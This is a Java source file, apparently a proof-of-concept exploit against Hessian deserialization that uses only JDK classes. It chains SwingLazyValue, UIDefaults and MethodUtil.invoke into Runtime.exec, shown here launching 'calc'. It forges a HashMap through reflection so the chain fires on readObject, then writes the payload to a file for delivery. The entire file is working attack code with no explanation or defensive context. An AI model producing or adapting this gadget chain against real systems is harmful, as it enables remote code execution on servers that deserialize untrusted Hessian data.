import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import com.caucho.hessian.io.*;
import java.io.*;
import java.util.HashMap;
import javax.swing.UIDefaults;
import sun.swing.SwingLazyValue;

public class Hessian_onlyJdk {
    public static void main(final String[] args) throws Exception {
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);
        SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});

        UIDefaults uiDefaults1 = new UIDefaults();
        uiDefaults1.put("_", slz);
        UIDefaults uiDefaults2 = new UIDefaults();
        uiDefaults2.put("_", slz);

        HashMap hashMap = makeMap(uiDefaults1,uiDefaults2);

//        HashMap<Object, Object> hashMap = new HashMap<>();
//        hashMap.put(uiDefaults1, uiDefaults1);
//        hashMap.put(uiDefaults2, uiDefaults2);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output oo = new Hessian2Output(bos);
        oo.getSerializerFactory().setAllowNonSerializable(true);
        oo.writeObject(hashMap);
        oo.flush();
        ByteArrayInputStream bai = new ByteArrayInputStream(bos.toByteArray());
        Hessian2Input hessian2Input = new Hessian2Input(bai);
        hessian2Input.readObject();

        File outputFile = new File("D://tmp//payload.bin");
        FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream);
        Hessian2Output output = new Hessian2Output(bufferedOutputStream);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(hashMap);
        output.flush();


    }
    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}